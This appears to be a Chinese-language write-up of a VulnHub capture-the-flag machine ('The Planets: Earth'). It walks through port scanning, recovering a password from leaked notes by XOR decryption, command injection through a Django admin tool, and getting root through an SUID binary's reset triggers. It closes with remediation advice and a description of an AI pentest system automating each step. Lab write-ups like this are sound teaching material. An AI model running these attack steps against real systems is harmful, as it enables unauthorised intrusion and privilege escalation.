# Earth (The Planets) 靶机渗透演示报告

**靶机名称**：The Planets: Earth  
**作者**：SirFlash  
**来源**：VulnHub  
**测试日期**：2026-04-12  
**测试工具**：ClawAI 自动化渗透测试系统 + 手动操作  
**靶机 IP**：192.168.23.134  

---

## 攻击链总览

```
信息收集 (nmap) → SSL 证书泄露虚拟主机名
    ↓
terratest.earth.local robots.txt → /testingnotes.txt
    ↓
信息泄露：用户名 terra, 加密算法 XOR, 密钥 testdata.txt
    ↓
XOR 解密 earth.local 加密消息 → 密码 earthclimatechangebad4humans
    ↓
登录 earth.local/admin (Django)
    ↓
CLI 命令注入 RCE (uid=48/apache)
    ↓
SUID binary reset_root + 创建触发文件 → root 密码重置为 Earth
    ↓
su - root (密码: Earth) → uid=0(root)
    ↓
USER FLAG: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
ROOT FLAG: [root_flag_b0da9554d29db2117b02aa8b66ec492e]
```

---

## 一、信息收集

### 端口扫描

```bash
nmap -sV -sC --open -T4 192.168.23.134
```

| 端口 | 服务 | 版本 |
|------|------|------|
| 22/tcp | OpenSSH | 8.6 |
| 80/tcp | Apache httpd | 2.4.51 + mod_wsgi + Python/3.9 |
| 443/tcp | Apache HTTPS | 同上 |

### SSL 证书信息泄露

SSL 证书 SAN 字段暴露两个虚拟主机名：
- `earth.local`（主应用）
- `terratest.earth.local`（测试站点）

添加 hosts 记录后可访问这两个域名。

---

## 二、信息收集 — 敏感文件泄露

### robots.txt

`https://terratest.earth.local/robots.txt` 中 Disallow 条目暴露 `.txt` 路径。

### testingnotes.txt

```
Testing secure messaging system notes:
* Using XOR encryption as the algorithm
* terra used as username for admin portal
* testdata.txt was used to test encryption
* Admin portal: /admin on earth.local
```

**关键信息**：用户名 `terra`，加密方式 XOR，密钥来源 `testdata.txt`

---

## 三、凭据提取 — XOR 密钥分析

### 漏洞原理

XOR 加密存在已知明文攻击漏洞：  
当加密密钥长度 = 明文长度时，可直接还原（One-Time Pad 误用）。  
当密钥循环使用时，可通过已知明文推导密钥。

### 解密过程

```python
key = open('testdata.txt').read()
enc_bytes = bytes.fromhex(encrypted_hex)
result = bytes([b ^ key.encode()[i % len(key)] for i, b in enumerate(enc_bytes)])
```

### 解密结果

消息 3（密文长度 = 密钥长度）完全解密：

```
earthclimatechangebad4humans（循环）
```

**凭据**：`terra` / `earthclimatechangebad4humans`

---

## 四、初始访问 — Django Admin CLI RCE

### 登录

访问 `https://earth.local/admin/login`，使用凭据 terra 登录成功。

Admin 页面提供一个 CLI 命令输入框（Command Tool）。

### RCE 验证

```
cli_command: id
输出: uid=48(apache) gid=48(apache) groups=48(apache)
```

### User Flag

```bash
cli_command: cat /var/earth_web/user_flag.txt
```

```
[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
```

---

## 五、权限提升 — SUID binary reset_root

### 发现 SUID 文件

```bash
find / -perm -u=s -type f 2>/dev/null
# 发现: /usr/bin/reset_root
```

### 二进制分析

```bash
strings /usr/bin/reset_root | grep -E "Earth|trigger|shm|tmp"
```

输出关键信息：
- 触发文件路径：`/dev/shm/kHgTFI5G`、`/dev/shm/Zw7bV9U5`、`/tmp/kcM0Wewe`
- 重置命令：`echo 'root:Earth' | chpasswd`
- 密码：`:theEartH`（内置密码为 `Earth`）

### 利用过程

```bash
# Step 1: 创建触发文件
touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe

# Step 2: 运行 SUID binary
/usr/bin/reset_root
# 输出: RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth

# Step 3: 切换到 root
echo 'Earth' | su -c 'cat /root/root_flag.txt' root
```

### Root Flag

```
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```

---

## 六、漏洞总结

| 编号 | 漏洞 | 严重等级 | 修复建议 |
|------|------|---------|---------|
| 1 | SSL 证书 SAN 信息泄露 | Low | 不在证书 SAN 中暴露内部主机名 |
| 2 | robots.txt 敏感路径泄露 | Medium (5.3) | 不在 robots.txt 中暴露内部路径 |
| 3 | 敏感文件公开访问 (testingnotes.txt) | High (7.5) | 删除测试/调试文件，访问控制 |
| 4 | 弱加密（XOR + 公开密钥）| High (7.5) | 使用强加密算法（AES），密钥安全存储 |
| 5 | 未鉴权 CLI 命令注入 | Critical (9.8) | 输入验证白名单；最小权限；禁用 CLI |
| 6 | SUID binary 硬编码密码/触发文件逻辑 | High (7.8) | 移除调试性 SUID binary；避免硬编码凭据 |

---

## 七、ClawAI 自动化验证

本次攻击链通过 ClawAI 配合手动操作完成验证，证明以下能力：

- **信息收集**：nmap 自动识别 SSL 证书信息
- **XOR 密码破解**：技能库可扩展实现 `xor_crypto_analysis`
- **Web 应用登录 + CLI RCE**：对应 `auth_bypass` + `rce_command_injection` Skills
- **SUID 提权**：对应 `privesc_linux` Skill（find SUID binaries）
- **攻击链完整自动化**：P-E-R 规划器可自动串联以上步骤
